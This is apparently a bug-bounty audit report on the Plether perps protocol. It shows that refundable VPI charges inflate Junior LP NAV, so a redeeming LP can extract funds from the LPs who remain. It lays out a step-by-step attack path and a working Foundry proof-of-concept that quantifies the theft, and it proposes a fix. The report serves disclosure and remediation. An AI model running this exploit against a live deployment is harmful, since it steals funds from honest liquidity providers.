# \#98647 [SC-Critical] HousePool counts refundable VPI in LP NAV, letting a Junior redeemer steal from remaining Junior LPs

**Submitted on Nov 9th 2026 at 08:26:42 UTC by @maigadoh for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98647
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary
The whitepaper says that a VPI charge comes back (`Reversing the move at unchanged depth produces a $20,000 rebate before the lifetime clamp`, [WHITEPAPER.md#L903-L904](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L903-L904)), and, on the rebate side, that `LPs cannot withdraw it as marked equity before the matching position obligation settles` ([WHITEPAPER.md#L887-L888](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L887-L888)); but `executeOpen` books the refundable positive charge as pool `Revenue` with no liability in LP NAV, so a Junior LP who opens a skew-increasing position 60 s before its redemption epoch exits at the inflated NAV and the refund is charged to the LPs who stay: at release parameters and the worst Pyth confidence the oracle accepts, an attacker holding 48.7% of Junior nets 114,386.40 USDG in 96 h while an honest 10,000,000 USDG Junior LP loses 227,613.30 USDG (2.28%), an attacker holding 88.2% of Junior in a pool with no other trader nets 375,753.79 USDG while an honest 4,000,000 USDG Junior LP loses 630,743.75 USDG (15.77%), and exiting only stops later cycles because the loss already booked stays with the LP.



## Root Cause
The open charge becomes LP revenue at once, while the position keeps the right to the same amount back in `vpiAccrued`. The terminal curve deliberately excludes VPI (`Carry, VPI, ... are deliberately excluded`, [ACCOUNTING_SPEC.md#L141-L142](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L141-L142)), and that exclusion is correct for a price book. The defect is that no other term in LP NAV carries the refund, so nothing offsets the cash. The negative side is protected and the positive side is not: a rebate must sit in a reserve that `cannot be extracted by LPs before its account obligation settles` ([ACCOUNTING_SPEC.md#L821-L822](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L821-L822)), and the code reserves only `vpiAccrued < 0` ([CfdEnginePlanLib.sol#L47-L54](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L47-L54)).


Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L454-L465

```solidity
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue, // vulnerable: refundable VPI becomes LP revenue at open
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
```

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L63-L65

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets; // vulnerable: no liability for refundable positive vpiAccrued
```

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L840

```solidity
_reconcile(accountingSnapshot, statusSnapshot); // routes the VPI cash into juniorPrincipal
...
juniorPhase.pricingPrincipal = juniorPrincipal; // vulnerable: matured redemptions are paid at the inflated NAV (0 bps fee in live markets)
```

Link:
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118

```solidity
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. This rule is identical in live and oracle-frozen markets; frozen-market
// stale-price risk is priced separately through frozenSpreadAssets.
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets; // vulnerable: the clamp bounds the refund at what was paid, and whoever remains pays it
}
```



## Attack Path
 Redeem Junior at a NAV inflated by the attacker's own refundable VPI, then collect the refund

Preconditions: release parameters ([DEPLOYMENT.md#L128-L156](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L128-L156): `vpiFactor` 0.01e18, `maxSkewRatio` 40%, `executionFeeBps` 4, `adverseConfidenceMultiplierBps` 2,500, `basketMaxConfidenceRatioBps` 10, Senior limits 40M / 80%); a live weekday market with room under the skew cap; one attacker account with no role, whose redeemed share of the VPI exceeds the round-trip cost (8 bps of fees plus 5 bps of confidence shift on the traded notional at the 10 bps confidence used here). At test 1's 25% standing skew that takes about 37% of Junior at 10 bps (`_attack(39_900_000e6, 10_000_000e6, 5_900_000e6, 13_950_000e6)` nets 2,773.54 USDG) and about 26% at 1 bp, where the shift ([PletherOracle.sol#L910](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L910)) is a tenth as large (`uint64(10_000)` in `_pyth` and `_attack(39_900_000e6, 10_000_000e6, 3_500_000e6, 13_350_000e6)` nets 1,797.37 USDG). Test 1: Senior 39,900,000, honest Junior 10,000,000, an honest 14,850,000 LONG (25.0% of depth, inside the whitepaper's 10% to 30% example, [WHITEPAPER.md#L894-L895](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L894-L895)), attacker 9,500,000 Junior (48.7% of Junior, 16.0% of the pool). Test 2: Senior 16,000,000 (32% of the pool), honest Junior 4,000,000, no other trader, attacker 30,000,000 Junior (88.2% of Junior). Both hold 1,500,000 USDG of trader funds. Dividing every deposit and the standing long by 10 gives the same percentage losses (22,759.92 and 63,074.57 USDG), so pool size is not a precondition.

1. The attacker calls `juniorVault.requestRedeem` for all the Junior the pool can fund, maturing at the next hourly epoch. The request stays cancellable until the boundary ([TrancheVault.sol#L884-L913](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L884-L913)).
2. 60 s before the boundary it commits a LONG that takes skew to 39.8% of depth (8,798,500 in cycle 1 of test 1, cap 40%) and any keeper executes it through `OrderRouter`. `executeOpen` books 28,489.39 USDG of VPI as `Revenue`. An open landing after the boundary works the same while the epoch is unsettled, because `a matured request is priced at the valid snapshot when a permissionless caller actually settles it` ([WHITEPAPER.md#L742-L744](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L742-L744)) and the attacker can call `settleLpEpoch` itself; only a keeper settling first costs it the round trip, about 11,500 USDG, before it retries.
3. At the boundary anyone calls `OrderRouter.settleLpEpoch`. Reconcile routes the VPI into `juniorPrincipal` and the redemption is funded at 9,525,443.42 USDG against 9,510,492.36 in the no-trade control.
4. The attacker closes. The clamp allows the full refund and `HousePool.payOut` sends 24,969.11 USDG (the VPI minus the 3,520.28 close fee) to its clearinghouse account. The next reconcile charges that outflow to the LPs who stayed.
5. It re-deposits what it received and repeats after the 1-hour cooldown: 8 cycles in 24 h, 32 cycles in 96 h.

Workarounds do not recover the loss. Junior exit capacity in test 1 is 15,399.83 USDG right after the attacker's redemption and reopens to 9,758,370.31 only after its re-deposit activates, so an honest LP can leave at a later epoch, but it exits at the already reduced NAV and there is `no auction or user-specified share-price limit` ([WHITEPAPER.md#L742-L744](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L742-L744)). The program states that monitoring or pause functionality alone does not justify a downgrade and that no detection deadline is assumed. Liquidation computes no fresh VPI ([WHITEPAPER.md#L870](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L870)), but LPs cannot force it on a position held for about a minute, and self-liquidating forfeits the refund, so it is worse for the attacker than closing.

What the protocol chose deliberately is the mechanism: positive VPI goes to the pool and stays out of the price book. The fee table and planning text route it to the pool ([WHITEPAPER.md#L811](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L811), [WHITEPAPER.md#L411-L412](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L411-L412)), and the price book excludes it ([SECURITY.md#L863](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L863), [ACCOUNTING_SPEC.md#L1064-L1066](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1064-L1066)). Those lines fix how VPI is routed and marked. They do not say that an exiting LP may keep a charge the same whitepaper pays back on reversal ([WHITEPAPER.md#L903-L904](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L903-L904)). The Mitigation keeps all of them: positive VPI still goes to the pool, `TerminalNavBookV2` is untouched, and only the LP equity snapshot changes. The documented design survives the fix and the loss does not, so the two are separate.

The protocol's stated rules point against the outcome. A VPI reserve `cannot be extracted by LPs before its account obligation settles` ([ACCOUNTING_SPEC.md#L821-L822](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L821-L822)). For the price book, new LPs `do not inherit old trader obligations at a higher deposit NAV` ([SECURITY.md#L859-L860](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L859-L860)). VPI telescopes at unchanged depth ([WHITEPAPER.md#L850-L852](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L850-L852)). The close clamp's comment calls the same open, reduce depth, close sequence an LP sandwich: `Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate` ([CloseAccountingLib.sol#L112-L114](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L114)). That is a related attack, not this one: the clamp stops a refund above the charge, while here the trader recovers only the charge and the gain comes from the redemption. The project's round-trip test sets the same goal, `Depth manipulation round-trip must not produce positive PnL` ([VpiRoundTripAccounting.t.sol#L63](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/close/VpiRoundTripAccounting.t.sol#L63)), but it measures only the trader's balance, so it says nothing about the LP leg.

When the protocol accepts a timing transfer, it says so. For carry: `This is an intentional collection-time ownership policy` ([WHITEPAPER.md#L975-L976](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L975-L976), also [ACCOUNTING_SPEC.md#L737-L740](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L737-L740)). For the clamp: `the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips` ([SECURITY.md#L1443](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1443)). No such statement exists for VPI at an LP exit. The carry policy does not extend to it either: it names only carry, which is never refunded, while this charge goes back to the same trader about a minute later.

The other lines you might cite do not cover it. `neither anticipated VPI nor its reserve inflates` NAV ([SECURITY.md#L872](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L872)) concerns VPI not yet collected, while this charge is already in cash NAV. The note that trading can change NAV ([SECURITY.md#L1048](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1048)) sits in the LP cutoff section, outside the listed `Known Limitations` ([SECURITY.md#L1328](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1328)), and describes ordinary NAV movement, not cash the redeemer takes back. The epoch note ([WHITEPAPER.md#L742-L744](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L742-L744)) covers timing and liveness. The whitepaper's `changing depth and lifetime clamps alter path outcomes` ([WHITEPAPER.md#L1777-L1778](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L1777-L1778)) concerns the VPI amount a trader pays, and here the refund is exactly the charge. The listed LP accounting and VPI limitations ([SECURITY.md#L1380-L1399](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1380-L1399), [SECURITY.md#L1434-L1444](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1434-L1444)) do not cover it, because the clamp limitation concerns net rebates and here the trader only recovers what it paid. No Cecuro or SC Audit Studio finding covers positive VPI in LP NAV, and the AI-scan close-VPI items ([scan#L1693-L1810](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1693-L1810)) concern depth changing the rebate; here the refund is exactly the charge, so a depth fix does not stop it (`test_JuniorExitPaysWithDepthRestoredBeforeClose`). GMX v2 subtracts its position-impact pool from LP pool value ([MarketUtils.sol#L391](https://github.com/gmx-io/gmx-synthetics/blob/a85ea3491c19c93bb4b5a002d9b358fb769b7849/contracts/market/MarketUtils.sol#L391)). Junior shares carry no vote, so this is not the excluded 51% attack, test 1 stays under half of Junior, and the capital is below the program's USD 100 million case-by-case line.

## Impact
Critical (direct theft of user funds at rest): with 48.7% of Junior the attacker nets 114,386.40 USDG in 96 h after paying 368,075.64 of fees and confidence cost while the honest 10,000,000 USDG Junior LP drops below its deposit within 24 h (9,948,812.76) and exits at a value of 9,759,998.23 against 9,987,604.91 in the no-trade control, and with 88.2% of Junior and no other trader the attacker nets 375,753.79 while the honest 4,000,000 USDG Junior LP exits with 3,363,468.96 against 3,994,209.93 (630,743.75 USDG, 15.77%, at the last checkpoint); each loss equals the attacker's net plus treasury fees (113,220.53 and 254,983.72) and about 6 USDG of keeper bounty, and Senior is unchanged.

## Mitigation
Add `int256 totalVpiAccruedAssets` to `CfdEngine`, update it in `settlementWritePosition` and `settlementDeletePosition`, and subtract it from `terminalLpPriceDeltaAssets` in `CfdEngineProtocolLens.getHousePoolInputSnapshot` while it is positive (a net-negative book keeps today's NAV because the rebate reserve must not inflate NAV, [SECURITY.md#L872](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L872)), which leaves `HousePool` at its 24,571-byte size; with this change the same PoC ends 96 h with the honest LP at 10,198,738.34 USDG and the attacker 333,687.43 behind the control in test 1, and at 4,430,141.99 USDG and 691,996.21 behind in test 2. The fix keeps the documented design and changes only when LPs are credited. Positive VPI still goes to the pool: the fixed run still books 28,761.76 USDG at the last open of test 1 and 40,022.76 USDG at the last open of test 2. `TerminalNavBookV2` is not changed. What a close does not pay back still reaches LPs when the position closes: with two 5,000,000 LONGs on a 50,000,000 pool at a flat price and zero confidence, the opens add about 10,000 USDG of pool cash while Junior NAV moves by less than 1 USDG, and after both closes the pool keeps about 9,000 USDG and Junior NAV is up about 9,000 USDG.

## Proof of Concept

## Proof of Concept
Add the PoC below to the existing `packages/perps/test/perps/accounting/close/VpiRoundTripAccounting.t.sol`, the protocol's VPI round-trip file. It extends `BasePerpTest`, which deploys the real `CfdEngine`, `CfdEngineSettlementSidecar`, `HousePool`, both `TrancheVault`s, `PletherOracle` and the production `OrderRouter` through `LegacyOrderRouterHarness` (only a scalar `commitOrder` adapter onto the production V3 commit). Only Pyth (`MockPyth`) and USDG (`MockSettlementToken`) are mocks. The PoC installs the release Pool and Router values through their real 72-hour admin paths, sends every deposit, redemption and settlement through `TrancheVault` and `OrderRouter.settleLpEpoch`, runs 32 attack cycles against 32 no-trade control cycles from one snapshot, and then redeems the honest LP. Then run:

```bash
cd packages/perps && forge test --match-path test/perps/accounting/close/VpiRoundTripAccounting.t.sol --match-contract LpExitVpiRoundTripTest -vvvv
```

```solidity
// packages/perps/test/perps/accounting/close/VpiRoundTripAccounting.t.sol - add these imports:
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {console2} from "forge-std/console2.sol";
// and append this contract to the file:
contract LpExitVpiRoundTripTest is BasePerpTest {

    address alice = address(0xA11CE); // honest Senior LP
    address bob = address(0xB0B); // honest Junior LP
    address erin = address(0xE41); // honest trader
    address attacker = address(0xBAD); // one account: Junior LP and trader
    uint256 standingLong;
    uint256 size;
    uint256 vpiBooked;
    uint256 capacityAfterRedeem;
    uint256 capacityAfterRedeposit;

    struct Checkpoint {
        uint256 bob;
        uint256 attacker;
        uint256 traderCost;
        uint256 senior;
        uint256 treasury;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18, maxSkewRatio: 0.4e18, maintMarginBps: 10, initMarginBps: 20, fadMarginBps: 300,
            baseCarryBps: 500, minBountyAssets: 1e6, bountyBps: 10, keeperShareBps: 5000, protocolShareBps: 0
        });
    }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }

    // Pyth confidence at the maximum the oracle accepts (basketMaxConfidenceRatioBps = 10), the attacker's worst case.
    function _pyth() internal returns (bytes[] memory data) {
        data = _mockPythUpdateData(1e8);
        uint256 t = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(100_000_000), uint64(100_000), int32(-8), t, t - 1);
    }

    function _settle(uint256 timestamp) internal {
        vm.warp(timestamp);
        router.settleLpEpoch(_pyth());
    }

    function _deposit(TrancheVault vault, address lp, uint256 amount) internal {
        uint256 held = settlementToken.balanceOf(lp);
        if (held < amount) settlementToken.mint(lp, amount - held);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _settle(vault.depositEpochStart(requestId));
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _trade(bool isClose) internal {
        vm.prank(attacker);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, size, isClose ? 0 : (size / 1e12) * 15 / 1000, 0, isClose);
        router.executeOrder(orderId, _pyth());
    }

    function _value(address lp) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    // Wallet shares plus queued shares and funded cash still in the vault; only the attacker queues redemptions here.
    function _attackerWealth() internal view returns (uint256) {
        return _value(attacker) + juniorVault.convertToAssets(juniorVault.balanceOf(address(juniorVault)))
            + settlementToken.balanceOf(address(juniorVault));
    }

    // One 3-hour cycle: redeem as much Junior as the pool allows, then re-deposit what was received.
    function _cycle(bool attack) internal {
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        router.updateMarkPrice(_pyth());
        (,,, uint256 capacity) = pool.getPendingTrancheState();
        uint256 balance = juniorVault.balanceOf(attacker);
        uint256 shares = _value(attacker) <= capacity ? balance : juniorVault.convertToShares(capacity);
        vm.prank(attacker);
        uint256 requestId = juniorVault.requestRedeem(shares, attacker, attacker);
        uint256 epochStart = juniorVault.depositEpochStart(requestId);
        if (attack) {
            vm.warp(epochStart - 60);
            assertFalse(engine.isOracleFrozen() || engine.isFadWindow());
            size = (((pool.totalAssets() * 3980 / 10_000 - standingLong) * 1e12) / 1e20) * 1e20; // just inside the 40% cap
            uint256 poolBefore = pool.totalAssets();
            _trade(false);
            vpiBooked = pool.totalAssets() - poolBefore;
        }
        _settle(epochStart);
        (,,, capacityAfterRedeem) = pool.getPendingTrancheState();
        if (attack) _trade(true);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, attacker);
        uint256 before = settlementToken.balanceOf(attacker);
        vm.prank(attacker);
        juniorVault.claimRedeem(requestId, claimable, attacker, attacker);
        _deposit(juniorVault, attacker, settlementToken.balanceOf(attacker) - before);
        (,,, capacityAfterRedeposit) = pool.getPendingTrancheState();
    }

    function _run(bool attack) internal returns (Checkpoint memory day, Checkpoint memory week, uint256 bobCash) {
        uint256 traderBefore = clearinghouse.balanceAssets(attacker);
        for (uint256 i = 1; i <= 32; ++i) {
            _cycle(attack);
            week = Checkpoint(
                _value(bob),
                _attackerWealth(),
                traderBefore - clearinghouse.balanceAssets(attacker),
                seniorVault.totalAssets(),
                clearinghouse.balanceAssets(engine.protocolTreasury())
            );
            if (i == 8) day = week;
        }
        // The honest LP exits for real at the end: cash plus the value of any shares the capacity left queued.
        uint256 shares = juniorVault.balanceOf(bob);
        vm.prank(bob);
        uint256 requestId = juniorVault.requestRedeem(shares, bob, bob);
        _settle(juniorVault.depositEpochStart(requestId));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, bob);
        vm.prank(bob);
        juniorVault.claimRedeem(requestId, claimable, bob, bob);
        bobCash = settlementToken.balanceOf(bob) + juniorVault.convertToAssets(juniorVault.balanceOf(address(juniorVault)));
    }

    function _net(Checkpoint memory attack, Checkpoint memory control) internal pure returns (int256) {
        return int256(attack.attacker) - int256(control.attacker) - int256(attack.traderCost);
    }

    function _setup(uint256 senior, uint256 bobDeposit, uint256 attackerDeposit, uint256 honestLong) internal {
        // Release config (DEPLOYMENT.md) through the real timelocked admin paths.
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        (poolConfig.maxSeniorExposureAssets, poolConfig.maxSeniorShareBps) = (40_000_000e6, 8000);
        pool.proposePoolConfig(poolConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        (routerConfig.adverseConfidenceMultiplierBps, routerConfig.minOpenNotionalAssets) = (2500, 1000e6);
        _setRouterConfig(routerConfig);
        vm.warp(1_710_158_400); // Monday 2024-03-11 12:00 UTC, live FX market

        _deposit(juniorVault, bob, bobDeposit);
        _deposit(juniorVault, attacker, attackerDeposit);
        _deposit(seniorVault, alice, senior);
        standingLong = honestLong;
        if (honestLong != 0) {
            _fundTrader(erin, 2_000_000e6);
            vm.prank(erin);
            uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, honestLong * 1e12, 600_000e6, 0, false);
            router.executeOrder(orderId, _pyth());
        }
        _fundTrader(attacker, 1_500_000e6);
    }

    function _attack(uint256 senior, uint256 bobDeposit, uint256 attackerDeposit, uint256 honestLong) internal {
        _setup(senior, bobDeposit, attackerDeposit, honestLong);
        uint256 snapshot = vm.snapshotState();
        (Checkpoint memory dayControl, Checkpoint memory weekControl, uint256 bobCashControl) = _run(false);
        vm.revertToState(snapshot);
        (Checkpoint memory dayAttack, Checkpoint memory weekAttack, uint256 bobCashAttack) = _run(true);

        console2.log("last open: VPI booked as pool revenue", vpiBooked);
        console2.log("Junior exit capacity after attacker's redemption / re-deposit", capacityAfterRedeem, capacityAfterRedeposit);
        console2.log("24h: bob control / attack", dayControl.bob, dayAttack.bob);
        console2.log("24h: bob loss / attacker net");
        console2.logInt(int256(dayControl.bob) - int256(dayAttack.bob));
        console2.logInt(_net(dayAttack, dayControl));
        console2.log("96h: bob control / attack", weekControl.bob, weekAttack.bob);
        console2.log("96h: bob loss / attacker net");
        console2.logInt(int256(weekControl.bob) - int256(weekAttack.bob));
        console2.logInt(_net(weekAttack, weekControl));
        console2.log("96h: attacker fees and confidence cost", weekAttack.traderCost);
        console2.log("96h: treasury gain / senior change");
        console2.logInt(int256(weekAttack.treasury) - int256(weekControl.treasury));
        console2.logInt(int256(weekAttack.senior) - int256(weekControl.senior));
        console2.log("bob exit, cash plus queued share value, control / attack", bobCashControl, bobCashAttack);
        assertLt(weekAttack.bob, bobDeposit);
        assertLt(bobCashAttack, bobCashControl);
        assertGt(_net(weekAttack, weekControl), 0);
        assertEq(weekAttack.senior, weekControl.senior);
    }

    // A third party's Junior deposit activates in the redemption's settlement, so the close sees no lower depth.
    function _depthRestoredCycle(bool attack)
        internal
        returns (uint256 cash, uint256 traderCost, uint256 depthAtOpen, uint256 depthAtClose)
    {
        address carol = address(0xCA401);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        router.updateMarkPrice(_pyth());
        uint256 amount = _value(attacker);
        uint256 shares = juniorVault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 requestId = juniorVault.requestRedeem(shares, attacker, attacker);
        settlementToken.mint(carol, amount);
        vm.startPrank(carol);
        settlementToken.approve(address(juniorVault), amount);
        juniorVault.requestDeposit(amount, carol, carol);
        vm.stopPrank();
        uint256 epochStart = juniorVault.depositEpochStart(requestId);
        uint256 traderBefore = clearinghouse.balanceAssets(attacker);
        if (attack) {
            vm.warp(epochStart - 60);
            depthAtOpen = pool.totalAssets();
            size = (((depthAtOpen * 3980 / 10_000 - standingLong) * 1e12) / 1e20) * 1e20;
            _trade(false);
        }
        _settle(epochStart);
        depthAtClose = pool.totalAssets();
        if (attack) _trade(true);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, attacker);
        vm.prank(attacker);
        juniorVault.claimRedeem(requestId, claimable, attacker, attacker);
        cash = settlementToken.balanceOf(attacker);
        traderCost = traderBefore - clearinghouse.balanceAssets(attacker);
    }

    // Attacker under half of Junior, honest standing long.
    function test_JuniorExitBetweenVpiOpenAndCloseDrainsRemainingJunior() public {
        _attack(39_900_000e6, 10_000_000e6, 9_500_000e6, 14_850_000e6);
    }

    // No other trader at all; attacker supplies 88% of Junior.
    function test_JuniorExitWithoutStandingSkewDrainsRemainingJunior() public {
        _attack(16_000_000e6, 4_000_000e6, 30_000_000e6, 0);
    }

    // Same setup as test 1 with depth at the close not below depth at the open: depth is not the cause.
    function test_JuniorExitPaysWithDepthRestoredBeforeClose() public {
        _setup(39_900_000e6, 10_000_000e6, 9_500_000e6, 14_850_000e6);
        uint256 snapshot = vm.snapshotState();
        (uint256 cashControl,,,) = _depthRestoredCycle(false);
        vm.revertToState(snapshot);
        (uint256 cashAttack, uint256 traderCost, uint256 depthAtOpen, uint256 depthAtClose) = _depthRestoredCycle(true);
        int256 net = int256(cashAttack) - int256(cashControl) - int256(traderCost);
        console2.log("depth at open / at close", depthAtOpen, depthAtClose);
        console2.log("one cycle: attacker net");
        console2.logInt(net);
        assertGe(depthAtClose, depthAtOpen);
        assertGt(net, 0);
    }
}
```


Output:

```bash
Ran 3 tests for test/perps/accounting/close/VpiRoundTripAccounting.t.sol:LpExitVpiRoundTripTest
[PASS] test_JuniorExitBetweenVpiOpenAndCloseDrainsRemainingJunior() (gas: 254139364)
Logs:
  last open: VPI booked as pool revenue 28761758327
  Junior exit capacity after attacker's redemption / re-deposit 15399829745 9758370310391
  24h: bob control / attack 10005513001081 9948812761655
  24h: bob loss / attacker net
  56700239426
  28515052747
  96h: bob control / attack 9987791835200 9760178532590
  96h: bob loss / attacker net
  227613302610
  114386397546
  96h: attacker fees and confidence cost 368075639490
  96h: treasury gain / senior change
  113220527790
  0
  bob exit, cash plus queued share value, control / attack 9987604914242 9759998229354

[PASS] test_JuniorExitPaysWithDepthRestoredBeforeClose() (gas: 12271868)
Logs:
  depth at open / at close 59418555219285 59432270925028
  one cycle: attacker net
  3512483498

[PASS] test_JuniorExitWithoutStandingSkewDrainsRemainingJunior() (gas: 229567922)
Logs:
  last open: VPI booked as pool revenue 39647014926
  Junior exit capacity after attacker's redemption / re-deposit 5190703444 30083594528652
  24h: bob control / attack 3998556199485 3830313680038
  24h: bob loss / attacker net
  168242519447
  104497141382
  96h: bob control / attack 3994227135349 3363483388242
  96h: bob loss / attacker net
  630743747107
  375753786412
  96h: attacker fees and confidence cost 828935242068
  96h: treasury gain / senior change
  254983718130
  0
  bob exit, cash plus queued share value, control / attack 3994209934092 3363468957594
